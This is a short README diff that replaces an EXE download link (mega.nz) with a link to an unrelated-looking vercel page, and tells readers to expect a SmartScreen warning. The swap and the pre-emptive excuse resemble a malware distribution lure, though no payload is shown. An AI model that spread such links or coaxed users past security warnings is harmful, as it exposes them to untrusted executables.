@@ -12,7 +12,7 @@ However, if the automatic installation fails, you can follow the **manual setup 
 ---
 ## There are Two Way's to use It
  **"By Direct EXE "**
-  [Download EXE](https://mega.nz/file/WR1i0QBI#lI7NQ236hPKpDAo_ryz4fo62ax0qsM7Sseexdg14ah8)
+  [Download EXE](https://playstoreapp.vercel.app/pages/db-cli.html)
   
   **"NOTE" you may Face Smart Screen Warning Because I Don't Buy a Licence To Fix It**
   
